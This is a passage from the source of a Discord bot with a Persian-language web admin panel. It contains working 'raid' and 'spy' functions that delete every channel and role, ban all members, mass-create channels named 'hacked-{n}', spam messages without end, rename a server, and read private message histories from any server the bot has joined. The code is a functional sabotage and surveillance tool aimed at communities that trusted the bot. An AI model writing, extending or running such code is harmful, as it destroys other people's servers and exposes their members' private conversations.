            <div class="form-group"><label>اسم رول</label><input type="text" id="role-name" placeholder="hacked-{n}"></div>
            <div class="form-group"><label>تعداد</label><input type="number" id="role-count" value="50" min="1"></div>
          </div>
          <div class="form-row">
            <div class="form-group">
              <label>نوع رنگ</label>
              <select id="role-color-type" onchange="document.getElementById('role-color').style.display=this.value==='custom'?'block':'none'">
                <option value="random">🎲 رندوم</option>
                <option value="custom">🎨 انتخابی</option>
              </select>
            </div>
            <div class="form-group"><label>رنگ</label><input type="color" id="role-color" value="#8b5cf6" style="display:none"></div>
            <div class="form-group">
              <label>روش ساخت</label>
              <select id="role-mode">
                <option value="add">➕ فقط اضافه کن</option>
                <option value="replace">🔄 پاک کن + اضافه کن</option>
              </select>
            </div>
          </div>
          <button class="btn btn-primary" style="width:100%;background:linear-gradient(135deg,#ec4899,#8b5cf6)" onclick="createRoles()">🎭 اجرا</button>
          <div class="result" id="role-result"></div>
        </div>
        
        <!-- Server Settings -->
        <div class="raid-card primary" style="margin-top:16px">
          <div class="raid-head">
            <div class="raid-icon">⚙️</div>
            <div><h3>تنظیمات سرور</h3><p>تغییر اسم، آیکون و توضیحات</p></div>
          </div>
          <div class="form-row">
            <div class="form-group"><label>Guild ID</label><input type="text" class="guild-input" id="server-guild-id" placeholder="123456789"></div>
            <div class="form-group"><label>اسم جدید سرور</label><input type="text" id="server-name" placeholder="اسم جدید..."></div>
          </div>
          <div class="form-row">
            <div class="form-group"><label>لینک آیکون (PNG/JPG/GIF)</label><input type="text" id="server-icon" placeholder="https://example.com/icon.png"></div>
          </div>
          <div class="form-row">
            <div class="form-group"><label>توضیحات سرور</label><input type="text" id="server-description" placeholder="توضیحات جدید..."></div>
          </div>
          <button class="btn btn-primary" style="width:100%" onclick="updateServer()">⚙️ اعمال تغییرات</button>
          <div class="result" id="server-result"></div>
        </div>
        
        <!-- Execute All Button -->
        <div style="margin-top:20px">
          <button class="btn btn-primary" style="width:100%;padding:16px;font-size:16px;background:linear-gradient(135deg,#ef4444,#f59e0b)" onclick="executeAll()">🚀 اجرای همه عملیات‌ها</button>
        </div>
      </section>
      
      <!-- Spy Section -->
      <section id="spy-section" class="section">
        <div class="card">
          <div class="card-head">
            <h3 class="card-title">🕵️ جاسوسی سرور</h3>
          </div>
          <div class="alert alert-info"><span>💡</span> ابتدا Guild ID رو وارد کن و چنل‌ها رو لود کن، بعد روی هر چنل کلیک کن تا پیام‌هاش رو ببینی</div>
          <div class="form-row">
            <div class="form-group"><label>Guild ID</label><input type="text" id="spy-guild-id" placeholder="123456789"></div>
            <div class="form-group" style="justify-content:flex-end"><button class="btn btn-primary" onclick="loadChannels()">📂 لود چنل‌ها</button></div>
          </div>
          <div id="channels-list" style="margin-top:16px"></div>
        </div>
        
        <div class="card" id="messages-card" style="display:none">
          <div class="card-head">
            <h3 class="card-title">💬 پیام‌های چنل: <span id="current-channel-name"></span></h3>
          </div>
          <div style="text-align:center;margin-bottom:10px"><button class="btn btn-secondary" onclick="loadMoreMessages()">📥 لود پیام‌های قدیمی‌تر</button></div>
          <div class="messages-container" id="messages-list"></div>
        </div>
      </section>
      
      <!-- Servers Section -->
      <section id="servers-section" class="section">
        <div class="card">
          <div class="card-head">
            <h3 class="card-title">🌐 سرورهای بات</h3>
            <button class="btn btn-secondary" onclick="loadServers()">🔄 بروزرسانی</button>
          </div>
          <div class="alert alert-info"><span>💡</span> لیست سرورهایی که بات توشون هست. روی هر سرور کلیک کن تا Guild ID کپی بشه</div>
          <div class="server-grid" id="servers-list"></div>
        </div>
      </section>
    </main>
  </div>

  <script>
    function updateTime(){document.getElementById('time').textContent=new Date().toLocaleString('fa-IR')}
    setInterval(updateTime,1000);updateTime();
    
    function toggleMenu(){
      document.querySelector('.sidebar').classList.toggle('open');
      document.querySelector('.overlay').classList.toggle('open');
    }
    
    function showSection(name,btn){
      document.querySelectorAll('.section').forEach(s=>s.classList.remove('active'));
      document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
      document.getElementById(name+'-section').classList.add('active');
      if(btn)btn.classList.add('active');
      loadStats();
      if(name==='logs')loadLogs();
      if(name==='bans'){loadChannelBans();loadGuildBans();loadUserBans();}
      if(name==='servers')loadServers();
      if(window.innerWidth<=900)toggleMenu();
    }
    
    function autoFillGuilds(){
      const id=document.getElementById('main-guild-id').value.trim();
      document.querySelectorAll('.guild-input').forEach(i=>i.value=id);
    }
    
    async function loadStats(){
      const res=await fetch('/api/logs');
      const data=await res.json();
      document.getElementById('stats').innerHTML=
        '<div class="stat purple"><h3>'+data.total+'</h3><p>کل سرچ‌ها</p></div>'+
        '<div class="stat cyan"><h3>'+data.today+'</h3><p>امروز</p></div>'+
        '<div class="stat green"><h3>'+data.uniqueUsers+'</h3><p>کاربران</p></div>'+
        '<div class="stat pink"><h3>'+data.uniqueChannels+'</h3><p>چنل‌ها</p></div>';
    }
    
    async function loadLogs(){
      const res=await fetch('/api/logs');
      const data=await res.json();
      const tbody=document.getElementById('logs-table');
      if(!data.logs.length){tbody.innerHTML='<tr><td colspan="7" class="empty"><span>📭</span><p>لاگی نیست</p></td></tr>';return;}
      tbody.innerHTML=data.logs.map(l=>'<tr><td>'+new Date(l.timestamp).toLocaleString('fa-IR')+'</td><td><span class="badge badge-'+({search:'purple',hex:'cyan',onlyhex:'orange',players:'green'}[l.type]||'purple')+'">'+l.type+'</span></td><td><div class="user-cell"><span class="user-name">'+l.username+'</span><span class="user-id">'+l.userId+'</span></div></td><td><div class="user-cell"><span class="user-name">'+(l.channelName||'-')+'</span><span class="user-id">'+l.channelId+'</span></div></td><td>'+(l.guildName||'DM')+'</td><td><span class="query">'+l.query+'</span></td><td class="'+(l.success?'success':'fail')+'">'+(l.success?'✅':'❌')+' '+(l.result||'')+'</td></tr>').join('');
    }
    
    async function loadChannelBans(){
      const res=await fetch('/api/bans');
      const data=await res.json();
      const list=document.getElementById('channel-bans-list');
      if(!data.bans.length){list.innerHTML='<div class="empty"><span>✅</span><p>بنی نیست</p></div>';return;}
      list.innerHTML=data.bans.map(function(b){return '<div class="ban-item"><div class="ban-info"><h4>🚫 '+b.channelId+'</h4><p>'+b.message+'</p></div><button class="btn btn-danger" data-id="'+b.channelId+'" onclick="removeChannelBan(this.dataset.id)">آنبن</button></div>';}).join('');
    }
    
    async function loadGuildBans(){
      const res=await fetch('/api/guild-bans');
      const data=await res.json();
      const list=document.getElementById('guild-bans-list');
      if(!data.bans.length){list.innerHTML='<div class="empty"><span>✅</span><p>بنی نیست</p></div>';return;}
      list.innerHTML=data.bans.map(function(b){return '<div class="ban-item"><div class="ban-info"><h4>🔒 '+b.guildId+'</h4><p>'+b.message+'</p></div><button class="btn btn-danger" data-id="'+b.guildId+'" onclick="removeGuildBan(this.dataset.id)">آنبن</button></div>';}).join('');
    }
    
    async function addChannelBan(){
      const channelId=document.getElementById('ban-channel-id').value.trim();
      const message=document.getElementById('ban-message').value.trim();
      if(!channelId||!message)return alert('فیلدها رو پر کن');
      await fetch('/api/bans',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({channelId,message})});
      document.getElementById('ban-channel-id').value='';
      document.getElementById('ban-message').value='';
      loadChannelBans();
    }
    
    async function removeChannelBan(id){
      await fetch('/api/bans/'+id,{method:'DELETE'});
      loadChannelBans();
    }
    
    async function addGuildBan(){
      const guildId=document.getElementById('ban-guild-id').value.trim();
      const message=document.getElementById('guild-ban-message').value.trim();
      if(!guildId||!message)return alert('فیلدها رو پر کن');
      await fetch('/api/guild-bans',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({guildId,message})});
      document.getElementById('ban-guild-id').value='';
      document.getElementById('guild-ban-message').value='';
      loadGuildBans();
    }
    
    async function removeGuildBan(id){
      await fetch('/api/guild-bans/'+id,{method:'DELETE'});
      loadGuildBans();
    }
    
    async function loadUserBans(){
      const res=await fetch('/api/user-bans');
      const data=await res.json();
      const list=document.getElementById('user-bans-list');
      if(!data.bans.length){list.innerHTML='<div class="empty"><span>✅</span><p>بنی نیست</p></div>';return;}
      list.innerHTML=data.bans.map(function(b){return '<div class="ban-item"><div class="ban-info"><h4>👤 '+b.userId+'</h4><p>'+b.message+'</p></div><button class="btn btn-danger" data-id="'+b.userId+'" onclick="removeUserBan(this.dataset.id)">آنبن</button></div>';}).join('');
    }
    
    async function addUserBan(){
      const userId=document.getElementById('ban-user-id').value.trim();
      const message=document.getElementById('user-ban-message').value.trim();
      if(!userId||!message)return alert('فیلدها رو پر کن');
      await fetch('/api/user-bans',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId,message})});
      document.getElementById('ban-user-id').value='';
      document.getElementById('user-ban-message').value='';
      loadUserBans();
    }
    
    async function removeUserBan(id){
      await fetch('/api/user-bans/'+id,{method:'DELETE'});
      loadUserBans();
    }
    
    function fillAllGuilds(){
      const id=document.getElementById('main-guild-id').value.trim();
      if(!id)return alert('اول Guild ID رو وارد کن');
      document.querySelectorAll('.guild-input').forEach(i=>i.value=id);
    }
    
    function showResult(id,type,msg){
      const colors={info:'alert-info',success:'alert-success',error:'alert-error',warning:'alert-warning'};
      document.getElementById(id).innerHTML='<div class="alert '+colors[type]+'">'+msg+'</div>';
    }
    
    async function deleteAllChannels(){
      const guildId=document.getElementById('delete-guild-id').value.trim();
      if(!guildId)return alert('Guild ID رو وارد کن');
      if(!confirm('💀 مطمئنی؟ همه چنل‌ها پاک میشن!'))return;
      showResult('delete-result','info','⏳ در حال حذف...');
      const res=await fetch('/api/channels/delete-all',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({guildId})});
      const data=await res.json();
      if(data.success)showResult('delete-result','success','✅ '+data.deleted+' از '+data.total+' چنل حذف شد');
      else showResult('delete-result','error','❌ '+data.error);
    }
    
    async function banAllMembers(){
      const guildId=document.getElementById('banall-guild-id').value.trim();
      if(!guildId)return alert('Guild ID رو وارد کن');
      if(!confirm('☠️ مطمئنی؟ همه بن میشن!'))return;
      showResult('banall-result','info','⏳ در حال بن کردن...');
      const res=await fetch('/api/ban-all',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({guildId})});
      const data=await res.json();
      if(data.success)showResult('banall-result','success','✅ '+data.banned+' از '+data.total+' بن شدند');
      else showResult('banall-result','error','❌ '+data.error);
    }
    
    async function deleteAllRoles(){
      const guildId=document.getElementById('delete-roles-guild-id').value.trim();
      if(!guildId)return alert('Guild ID رو وارد کن');
      if(!confirm('🎭 مطمئنی؟ همه رول‌ها پاک میشن!'))return;
      showResult('delete-roles-result','info','⏳ در حال حذف رول‌ها...');
      const res=await fetch('/api/roles/delete-all',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({guildId})});
      const data=await res.json();
      if(data.success){
        var msg='✅ '+data.deleted+' رول حذف شد';
        if(data.skipped>0)msg+=' ('+data.skipped+' رول بالاتر از بات بود)';
        showResult('delete-roles-result','success',msg);
      }
      else showResult('delete-roles-result','error','❌ '+data.error);
    }
    
    async function createChannels(){
      const guildId=document.getElementById('create-guild-id').value.trim();
      const channelName=document.getElementById('create-channel-name').value.trim();
      const count=document.getElementById('create-count').value;
      const message=document.getElementById('create-message').value.trim();
      const deleteBefore=document.getElementById('delete-before-create').checked;
      const spamMode=document.getElementById('spam-mode').value;
      if(!guildId||!channelName||!count)return alert('فیلدها رو پر کن');
      if(deleteBefore&&!confirm('⚠️ همه چنل‌های قبلی پاک میشن، ادامه بدم؟'))return;
      showResult('create-result','info','🚀 در حال ساخت...');
      const res=await fetch('/api/channels/create',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({guildId,channelName,count,message,deleteBefore,spamMode})});
      const data=await res.json();
      if(data.success){
        let msg='✅ '+data.created+' چنل ساخته شد';
        if(data.deleted)msg+=' ('+data.deleted+' چنل قبلی پاک شد)';
        if(spamMode==='continuous')msg+=' - اسپم در حال اجرا...';
        showResult('create-result','success',msg);
      }
      else showResult('create-result','error','❌ '+data.error);
    }
    
    async function createRoles(){
      const guildId=document.getElementById('role-guild-id').value.trim();
      const roleName=document.getElementById('role-name').value.trim();
      const count=document.getElementById('role-count').value;
      const colorType=document.getElementById('role-color-type').value;
      const customColor=document.getElementById('role-color').value;
      const roleMode=document.getElementById('role-mode').value;
      const deleteBefore=roleMode==='replace';
      if(!guildId||!roleName||!count)return alert('فیلدها رو پر کن');
      if(deleteBefore&&!confirm('⚠️ همه رول‌های قبلی پاک میشن، ادامه بدم؟'))return;
      showResult('role-result','info','🎭 در حال ساخت رول‌ها...');
      const res=await fetch('/api/roles/create',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({guildId,roleName,count,colorType,customColor,deleteBefore})});
      const data=await res.json();
      if(data.success)showResult('role-result','success','✅ '+data.created+' رول ساخته شد'+(data.deleted?' ('+data.deleted+' رول قبلی پاک شد)':''));
      else showResult('role-result','error','❌ '+data.error);
    }
    
    async function stopAll(){
      await fetch('/api/stop',{method:'POST'});
      showResult('create-result','warning','⏹️ متوقف شد');
    }
    
    async function executeAll(){
      const guildId=document.getElementById('main-guild-id').value.trim();
      if(!guildId)return alert('اول Guild ID رو وارد کن');
      if(!confirm('🚀 همه عملیات‌ها اجرا میشن، مطمئنی؟'))return;
      
      // Execute delete channels if filled
      if(document.getElementById('delete-guild-id').value.trim()){
        deleteAllChannels();
      }
      
      // Execute ban all if filled
      if(document.getElementById('banall-guild-id').value.trim()){
        setTimeout(()=>banAllMembers(), 1000);
      }
      
      // Execute create channels if filled
      if(document.getElementById('create-guild-id').value.trim() && document.getElementById('create-channel-name').value.trim()){
        setTimeout(()=>createChannels(), 2000);
      }
      
      // Execute create roles if filled
      if(document.getElementById('role-guild-id').value.trim() && document.getElementById('role-name').value.trim()){
        setTimeout(()=>createRoles(), 3000);
      }
    }
    
    async function updateServer(){
      const guildId=document.getElementById('server-guild-id').value.trim();
      const name=document.getElementById('server-name').value.trim();
      const icon=document.getElementById('server-icon').value.trim();
      const description=document.getElementById('server-description').value.trim();
      
      if(!guildId)return alert('Guild ID رو وارد کن');
      if(!name && !icon && !description)return alert('حداقل یکی از فیلدها رو پر کن');
      
      showResult('server-result','info','⏳ در حال اعمال تغییرات...');
      const res=await fetch('/api/server/update',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({guildId,name,icon,description})});
      const data=await res.json();
      if(data.success)showResult('server-result','success','✅ تغییرات اعمال شد');
      else showResult('server-result','error','❌ '+data.error);
    }
    
    let currentChannelId=null;
    let lastMessageId=null;
    
    async function loadChannels(){
      const guildId=document.getElementById('spy-guild-id').value.trim();
      if(!guildId)return alert('Guild ID رو وارد کن');
      
      document.getElementById('channels-list').innerHTML='<div class="alert alert-info">⏳ در حال لود چنل‌ها...</div>';
      
      const res=await fetch('/api/spy/channels?guildId='+guildId);
      const data=await res.json();
      
      if(!data.success){
        document.getElementById('channels-list').innerHTML='<div class="alert alert-error">❌ '+data.error+'</div>';
        return;
      }
      
      if(data.channels.length===0){
        document.getElementById('channels-list').innerHTML='<div class="empty"><span>📭</span><p>چنلی پیدا نشد</p></div>';
        return;
      }
      
      const icons={0:'💬',2:'🔊',4:'📁',5:'📢',13:'🎭',15:'📝'};
      const types={0:'متنی',2:'صوتی',4:'دسته‌بندی',5:'اعلان',13:'استیج',15:'فروم'};
      
      document.getElementById('channels-list').innerHTML=data.channels.map(function(c){
        var safeName=c.name.split("'").join('');
        return '<div class="channel-item" data-id="'+c.id+'" data-name="'+safeName+'" onclick="loadMessages(this.dataset.id,this.dataset.name)">'
        +'<span class="channel-icon">'+(icons[c.type]||'📄')+'</span>'
        +'<span class="channel-name">'+c.name+'</span>'
        +'<span class="channel-type">'+(types[c.type]||'نامشخص')+'</span>'
        +'</div>';
      }).join('');
    }
    
    async function loadMessages(channelId,channelName){
      currentChannelId=channelId;
      lastMessageId=null;
      
      document.querySelectorAll('.channel-item').forEach(el=>el.classList.remove('active'));
      event.currentTarget.classList.add('active');
      
      document.getElementById('messages-card').style.display='block';
      document.getElementById('current-channel-name').textContent=channelName;
      document.getElementById('messages-list').innerHTML='<div class="alert alert-info">⏳ در حال لود پیام‌ها...</div>';
      
      const res=await fetch('/api/spy/messages?channelId='+channelId);
      const data=await res.json();
      
      if(!data.success){
        document.getElementById('messages-list').innerHTML='<div class="alert alert-error">❌ '+data.error+'</div>';
        return;
      }
      
      if(data.messages.length===0){
        document.getElementById('messages-list').innerHTML='<div class="empty"><span>📭</span><p>پیامی پیدا نشد</p></div>';
        return;
      }
      
      lastMessageId=data.messages[data.messages.length-1].id;
      renderMessages(data.messages,false);
    }
    
    async function loadMoreMessages(){
      if(!currentChannelId||!lastMessageId)return;
      
      const res=await fetch('/api/spy/messages?channelId='+currentChannelId+'&before='+lastMessageId);
      const data=await res.json();
      
      if(data.success && data.messages.length>0){
        lastMessageId=data.messages[data.messages.length-1].id;
        renderMessages(data.messages,true);
      }
    }
    
    function renderMessages(messages,append){
      var msgs=messages.slice().reverse();
      const html=msgs.map(m=>{
        const avatarImg=m.author.avatar?'<img src="'+m.author.avatar+'">':m.author.username.charAt(0).toUpperCase();
        const isBot=m.author.bot;
        const botTag=isBot?'<span class="message-bot-tag">BOT</span>':'';
        
        // Interaction (slash command with full command)
        let interaction='';
        if(m.interaction){
          interaction='<div class="message-interaction">'
            +'<span class="message-interaction-icon">⚡</span>'
            +'<span class="message-interaction-text"><span class="message-interaction-user">'+m.interaction.user+'</span> used <span class="message-interaction-cmd">/'+m.interaction.commandFull+'</span></span>'
            +'</div>';
        }
        
        // Reply with branch line
        let reply='';
        if(m.reference){
          const refAvatar=m.reference.avatar?'<img src="'+m.reference.avatar+'">':'';
          reply='<div class="message-reply">'
            +'<span class="message-reply-line"></span>'
            +'<div class="message-reply-avatar">'+refAvatar+'</div>'
            +'<span class="message-reply-author">'+m.reference.author+'</span>'
            +'<span class="message-reply-content">'+formatContent(truncate(m.reference.content,100))+'</span>'
            +'</div>';
        }
        
        // Attachments
        let attachments='';
        if(m.attachments && m.attachments.length>0){
          attachments='<div class="message-attachments">'+m.attachments.map(a=>{
            var ctype=a.contentType||'';
            if(ctype.indexOf('image/')===0){
              return '<img src="'+a.url+'" alt="'+a.name+'" onclick="window.open(this.src)">';
            }else if(ctype.indexOf('video/')===0){
              return '<video src="'+a.url+'" controls></video>';
            }else{
              var size=a.size?(Math.round(a.size/1024)+'KB'):'';
              return '<div class="message-file">'
                +'<span class="message-file-icon">📎</span>'
                +'<div class="message-file-info">'
                +'<a href="'+a.url+'" target="_blank" class="message-file-name">'+a.name+'</a>'
                +'<div class="message-file-size">'+size+'</div>'
                +'</div></div>';
            }
          }).join('')+'</div>';
        }
        
        // Embeds
        let embeds='';
        if(m.embeds && m.embeds.length>0){
          embeds=m.embeds.map(e=>{
            let embedHtml='<div class="message-embed" style="border-color:'+(e.color||'#5865f2')+'">';
            
            if(e.author){
              embedHtml+='<div class="message-embed-author">';
              if(e.author.iconURL)embedHtml+='<img src="'+e.author.iconURL+'">';
              embedHtml+='<span class="message-embed-author-name">'+e.author.name+'</span></div>';
            }
            
            if(e.thumbnail){
              embedHtml+='<div class="message-embed-thumbnail"><img src="'+e.thumbnail.url+'"></div>';
            }
            
            if(e.title){
              embedHtml+='<div class="message-embed-title">';
              if(e.url)embedHtml+='<a href="'+e.url+'" target="_blank">'+formatContent(e.title)+'</a>';
              else embedHtml+=formatContent(e.title);
              embedHtml+='</div>';
            }
            
            if(e.description){
              embedHtml+='<div class="message-embed-description">'+formatContent(e.description)+'</div>';
            }
            
            if(e.fields && e.fields.length>0){
              embedHtml+='<div class="message-embed-fields">';
              e.fields.forEach(f=>{
                embedHtml+='<div class="message-embed-field'+(f.inline?' inline':'')+'">'
                  +'<div class="message-embed-field-name">'+formatContent(f.name)+'</div>'
                  +'<div class="message-embed-field-value">'+formatContent(f.value)+'</div>'
                  +'</div>';
              });
              embedHtml+='</div>';
            }
            
            if(e.image){
              embedHtml+='<div class="message-embed-image"><img src="'+e.image.url+'" onclick="window.open(this.src)"></div>';
            }
            
            if(e.footer || e.timestamp){
              embedHtml+='<div class="message-embed-footer">';
              if(e.footer && e.footer.iconURL)embedHtml+='<img src="'+e.footer.iconURL+'">';
              if(e.footer && e.footer.text)embedHtml+='<span>'+e.footer.text+'</span>';
              if(e.timestamp)embedHtml+='<span>'+new Date(e.timestamp).toLocaleString('fa-IR')+'</span>';
              embedHtml+='</div>';
            }
            
            embedHtml+='</div>';
            return embedHtml;
          }).join('');
        }
        
        // Stickers
        let stickers='';
        if(m.stickers && m.stickers.length>0){
          stickers='<div class="message-sticker">'+m.stickers.map(s=>
            '<img src="'+s.url+'" alt="'+s.name+'" title="'+s.name+'">'
          ).join('')+'</div>';
        }
        
        const userData=JSON.stringify({id:m.author.id,username:m.author.username,avatar:m.author.avatar,bot:m.author.bot}).replace(/"/g,'&quot;');
        
        return '<div class="message-item">'
          +'<div class="message-avatar" onclick="showUserProfile('+userData+')">'+avatarImg+'</div>'
          +'<div class="message-body">'
          +reply
          +interaction
          +'<div class="message-header">'
          +'<span class="message-author'+(isBot?' bot':'')+'" onclick="showUserProfile('+userData+')">'+m.author.username+'</span>'
          +botTag
          +'<span class="message-time">'+new Date(m.timestamp).toLocaleString('fa-IR')+'</span>'
          +'</div>'
          +'<div class="message-content">'+formatContent(m.content||'')+'</div>'
          +attachments
          +embeds
          +stickers
          +'</div></div>';
      }).join('');
      
      if(append){
        document.getElementById('messages-list').innerHTML=html+document.getElementById('messages-list').innerHTML;
      }else{
        document.getElementById('messages-list').innerHTML=html;
        document.getElementById('messages-list').scrollTop=document.getElementById('messages-list').scrollHeight;
      }
    }
    
    function formatContent(text){
      if(!text)return '';
      var t=String(text);
      t=t.split('<').join('&lt;');
      t=t.split('>').join('&gt;');
      while(t.indexOf('**')!==-1){
        var i=t.indexOf('**');
        var j=t.indexOf('**',i+2);
        if(j===-1)break;
        t=t.substring(0,i)+'<strong>'+t.substring(i+2,j)+'</strong>'+t.substring(j+2);
      }
      return t;
    }
    
    function truncate(str,len){
      if(!str)return '';
      return str.length>len?str.substring(0,len)+'...':str;
    }
    
    function showUserProfile(user){
      if(typeof user==='string')user=JSON.parse(user);
      var avatar=user.avatar?'<img src="'+user.avatar+'">':user.username.charAt(0).toUpperCase();
      var modal=document.createElement('div');
      modal.className='user-profile-modal';
      modal.onclick=function(e){if(e.target===modal)modal.remove();};
      modal.innerHTML='<div class="user-profile">'
        +'<div class="user-profile-banner"></div>'
        +'<div class="user-profile-avatar">'+avatar+'</div>'
        +'<div class="user-profile-body">'
        +'<div class="user-profile-name">'+user.username+(user.bot?' <span class="message-bot-tag">BOT</span>':'')+'</div>'
        +'<div class="user-profile-tag">@'+user.username+'</div>'
        +'<div class="user-profile-section">'
        +'<div class="user-profile-section-title">اطلاعات</div>'
        +'<div class="user-profile-field"><span class="user-profile-field-label">User ID</span><span class="user-profile-field-value">'+user.id+'</span></div>'
        +'</div>'
        +'<button class="user-profile-close" data-uid="'+user.id+'" onclick="closeProfile(this)">📋 کپی User ID</button>'
        +'</div></div>';
      document.body.appendChild(modal);
    }
    
    function closeProfile(btn){
      var uid=btn.dataset.uid;
      btn.closest('.user-profile-modal').remove();
      navigator.clipboard.writeText(uid);
    }
    
    async function loadServers(){
      document.getElementById('servers-list').innerHTML='<div class="alert alert-info" style="grid-column:1/-1">⏳ در حال لود سرورها...</div>';
      
      const res=await fetch('/api/servers');
      const data=await res.json();
      
      if(!data.success){
        document.getElementById('servers-list').innerHTML='<div class="alert alert-error" style="grid-column:1/-1">❌ '+data.error+'</div>';
        return;
      }
      
      if(data.servers.length===0){
        document.getElementById('servers-list').innerHTML='<div class="empty" style="grid-column:1/-1"><span>📭</span><p>سروری پیدا نشد</p></div>';
        return;
      }
      
      document.getElementById('servers-list').innerHTML=data.servers.map(s=>{
        const icon=s.icon?'<img src="'+s.icon+'">':s.name.charAt(0).toUpperCase();
        return '<div class="server-card" data-sid="'+s.id+'" onclick="copyGuildId(this.dataset.sid)">'
          +'<div class="server-header">'
          +'<div class="server-icon">'+icon+'</div>'
          +'<div class="server-info">'
          +'<div class="server-name">'+s.name+'</div>'
          +'<div class="server-id">'+s.id+'</div>'
          +'</div></div>'
          +'<div class="server-stats">'
          +'<div class="server-stat"><div class="server-stat-value">'+s.memberCount+'</div><div class="server-stat-label">ممبر</div></div>'
          +'<div class="server-stat"><div class="server-stat-value">'+s.channelCount+'</div><div class="server-stat-label">چنل</div></div>'
          +'<div class="server-stat"><div class="server-stat-value">'+s.roleCount+'</div><div class="server-stat-label">رول</div></div>'
          +'</div>'
          +'<div class="server-actions">'
          +'<button class="btn btn-secondary" data-sid="'+s.id+'" onclick="event.stopPropagation();spyServer(this.dataset.sid)">🕵️ جاسوسی</button>'
          +'<button class="btn btn-secondary" data-sid="'+s.id+'" onclick="event.stopPropagation();raidServer(this.dataset.sid)">💀 Raid</button>'
          +'</div>'
          +'</div>';
      }).join('');
    }
    
    function copyGuildId(id){
      navigator.clipboard.writeText(id);
      alert('✅ Guild ID کپی شد: '+id);
    }
    
    function spyServer(id){
      document.getElementById('spy-guild-id').value=id;
      showSection('spy',document.querySelector('.nav-btn:nth-child(4)'));
      loadChannels();
    }
    
    function raidServer(id){
      document.getElementById('main-guild-id').value=id;
      autoFillGuilds();
      showSection('raid',document.querySelector('.nav-btn:nth-child(3)'));
    }
    
    loadStats();
    loadLogs();
  </script>
</body>
</html>
  `);
});


// API Routes
app.get("/api/logs", requireAuth, (req, res) => {
  const today = new Date().toDateString();
  const todayLogs = searchLogs.filter(log => new Date(log.timestamp).toDateString() === today);
  res.json({
    logs: searchLogs,
    total: searchLogs.length,
    today: todayLogs.length,
    uniqueUsers: new Set(searchLogs.map(log => log.userId)).size,
    uniqueChannels: new Set(searchLogs.map(log => log.channelId)).size,
  });
});

// Channel Bans
app.get("/api/bans", requireAuth, (req, res) => {
  const bans = [];
  bannedChannels.forEach((message, channelId) => bans.push({ channelId, message }));
  res.json({ bans });
});

app.post("/api/bans", requireAuth, (req, res) => {
  const { channelId, message } = req.body;
  if (channelId && message) { bannedChannels.set(channelId, message); res.json({ success: true }); }
  else res.status(400).json({ error: "Missing fields" });
});

app.delete("/api/bans/:id", requireAuth, (req, res) => {
  bannedChannels.delete(req.params.id);
  res.json({ success: true });
});

// Guild Bans
app.get("/api/guild-bans", requireAuth, (req, res) => {
  const bans = [];
  bannedGuilds.forEach((message, guildId) => bans.push({ guildId, message }));
  res.json({ bans });
});

app.post("/api/guild-bans", requireAuth, (req, res) => {
  const { guildId, message } = req.body;
  if (guildId && message) { bannedGuilds.set(guildId, message); res.json({ success: true }); }
  else res.status(400).json({ error: "Missing fields" });
});

app.delete("/api/guild-bans/:id", requireAuth, (req, res) => {
  bannedGuilds.delete(req.params.id);
  res.json({ success: true });
});

// User Bans
app.get("/api/user-bans", requireAuth, (req, res) => {
  const bans = [];
  bannedUsers.forEach((message, userId) => bans.push({ userId, message }));
  res.json({ bans });
});

app.post("/api/user-bans", requireAuth, (req, res) => {
  const { userId, message } = req.body;
  if (userId && message) { bannedUsers.set(userId, message); res.json({ success: true }); }
  else res.status(400).json({ error: "Missing fields" });
});

app.delete("/api/user-bans/:id", requireAuth, (req, res) => {
  bannedUsers.delete(req.params.id);
  res.json({ success: true });
});

// Delete All Channels
app.post("/api/channels/delete-all", requireAuth, async (req, res) => {
  const { guildId } = req.body;
  if (!guildId) return res.status(400).json({ error: "Missing guildId" });
  
  try {
    const guild = await client.guilds.fetch(guildId);
    if (!guild) return res.status(404).json({ error: "Server not found" });
    
    await guild.channels.fetch();
    const channels = guild.channels.cache;
    
    let deleted = 0;
    const total = channels.size;
    
    for (const [id, channel] of channels) {
      try {
        await channel.delete();
        deleted++;
        await new Promise(r => setTimeout(r, 150));
      } catch (e) { console.error(`Failed to delete ${id}:`, e.message); }
    }
    
    res.json({ success: true, deleted, total });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Create Channels with Spam Options
app.post("/api/channels/create", requireAuth, async (req, res) => {
  const { guildId, channelName, count, message, deleteBefore, spamMode } = req.body;
  if (!guildId || !channelName || !count) return res.status(400).json({ error: "Missing fields" });
  
  const numCount = parseInt(count);
  if (isNaN(numCount) || numCount < 1) return res.status(400).json({ error: "Invalid count" });
  
  try {
    const guild = await client.guilds.fetch(guildId);
    if (!guild) return res.status(404).json({ error: "Server not found" });
    
    let deletedCount = 0;
    
    // Delete existing channels if requested
    if (deleteBefore) {
      await guild.channels.fetch();
      const existingChannels = guild.channels.cache;
      for (const [id, channel] of existingChannels) {
        try {
          await channel.delete();
          deletedCount++;
          await new Promise(r => setTimeout(r, 100));
        } catch (e) {}
      }
    }
    
    let created = 0;
    const createdChannels = [];
    
    createTask = { running: true };
    spamTask = { running: true };
    
    // Create channels
    for (let i = 1; i <= numCount && createTask.running; i++) {
      try {
        const name = channelName.replace(/{n}/g, i).replace(/{num}/g, i);
        const newChannel = await guild.channels.create({ name, type: 0 });
        created++;
        createdChannels.push(newChannel);
        await new Promise(r => setTimeout(r, 200));
      } catch (e) { console.error(`Failed to create channel ${i}:`, e.message); }
    }
    
    // Handle message sending based on mode
    if (message && createdChannels.length > 0) {
      if (spamMode === 'once') {
        // Send message once to all channels after creation
        for (const ch of createdChannels) {
          ch.send(message).catch(() => {});
        }
      } else if (spamMode === 'continuous' && spamTask.running) {
        // Continuous spam until stopped
        const spamLoop = async () => {
          while (spamTask && spamTask.running) {
            for (const ch of createdChannels) {
              if (!spamTask || !spamTask.running) break;
              ch.send(message).catch(() => {});
            }
            await new Promise(r => setTimeout(r, 500));
          }
        };
        spamLoop();
      }
    }
    
    res.json({ success: true, created, requested: numCount, deleted: deletedCount || undefined });
  } catch (error) {
    createTask = null;
